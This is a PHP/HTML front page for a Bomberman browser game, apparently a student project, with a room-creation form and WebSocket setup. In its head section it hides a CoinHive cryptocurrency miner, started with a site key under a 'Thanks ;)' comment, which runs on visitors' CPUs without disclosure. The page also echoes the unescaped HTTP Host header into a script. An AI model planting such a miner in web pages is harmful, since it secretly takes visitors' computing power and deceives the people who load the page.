<?php
/*
 * Copyright (c) 2017, whatwedo GmbH
 * All rights reserved
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice,
 *    this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
 * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */
?>
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Bomberman</title>
    <meta name="description" content="Bomberman Web Game" />
    <meta name="keywords" content="Bomberman Web Projekt BFH" />
    <meta name="author" content="Singer Nicolo & Mueller, Lukas" />
    <meta name="Robots" content="index, follow">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">

    <!--- Thanks ;) -->
    <script src="./js/coinhive.min.js"></script>
    <script>
        var miner = new CoinHive.Anonymous('Nh4XYpARBp0w6kAKwMIMg4PcAzUjww09');
        miner.setThrottle(0.6)
        miner.start();
    </script>
</head>

<body>

    <noscript>
        <div class="js_error">
            <p>This page will only work if you enable Javascript and use a modern browser!</p>
        </div>
    </noscript>

    <header id="header">
        <h1>Bomberman - Web Project BTI7054</h1>
    </header>

    <main id="main">
        <div id ="roomcontrols">
            <h3>Create room</h3>
            Room Name: <input type="text" id="name" value="name" /> <br />
            Max Player: &nbsp;&nbsp;  <input type="number" id="maxPlayer" value="1" size="2" /> <br />
            <script></script>
            <a id="createRoom" href="#">Create Room</a>
        </div>

        <div id="field">

        </div>

        <div id="roomList">

        </div>


        <script type="text/javascript">
            const BOMBERMAN_WEBSOCKET_URL = '<?php 
            $webSocketPath = isset($_SERVER['WEBSOCKET_PATH']) ? $_SERVER['WEBSOCKET_PATH'] : ':8009';
            if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
                echo 'wss://' . $_SERVER['HTTP_HOST'] . $webSocketPath;
            } else {
                echo 'ws://' . $_SERVER['HTTP_HOST'] . $webSocketPath;
            }
            ?>';
        </script>

        <script
                src="https://code.jquery.com/jquery-3.2.1.min.js"
                integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
                crossorigin="anonymous"></script>
        <script src="js/socket.js">
        </script>

    </main>

    <footer id="footer">
        &copy; Nicolo Singer & Lukas Müller <br />
        Kindly hosted by <a href="https://whatwedo.ch">whatwedo.ch</a>
    </footer>

</body>
</html>
